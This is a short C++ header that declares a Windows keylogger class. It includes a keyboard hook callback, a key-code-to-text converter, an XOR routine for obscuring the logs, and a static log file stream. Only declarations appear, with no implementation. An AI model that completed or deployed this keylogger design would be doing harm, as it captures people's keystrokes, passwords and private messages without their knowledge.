#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <iostream>
#include <fstream>

class Keylogger {
private:
    static wchar_t* key;
    
public:
    static std::ofstream kblog;

    Keylogger(wchar_t* k);
    ~Keylogger();

    static void XOR(wchar_t* data, int data_len, wchar_t* key, int key_len);

    static wchar_t* vk2ascii(UINT vkCode);
    static LRESULT CALLBACK KBHook(int code, WPARAM wParam, LPARAM lParam);
};